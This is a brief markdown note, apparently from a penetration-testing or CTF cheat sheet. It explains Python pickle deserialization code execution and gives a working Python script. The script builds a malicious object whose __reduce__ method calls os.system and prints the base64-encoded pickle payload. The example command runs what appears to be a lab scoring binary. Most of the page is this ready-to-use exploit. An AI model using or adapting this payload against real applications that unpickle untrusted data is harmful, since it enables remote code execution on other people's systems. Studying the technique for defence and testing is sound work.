---
description: Serialization
---

# Pickle Code Execution

If an application unserializes data using pickle based on a string under your control, you can execute code in the application. To do so, you will need to create a malicious object.

```
import os
import base64
import pickle

class Blah(object):
  def __reduce__(self):
    return (os.system,("/usr/local/bin/score 9099ff30-bcb2-4aa6-be31-bb9e8de9ef03",))

h=Blah()
print(base64.b64encode(pickle.dumps(h,2)))
```

The above code is in Python3
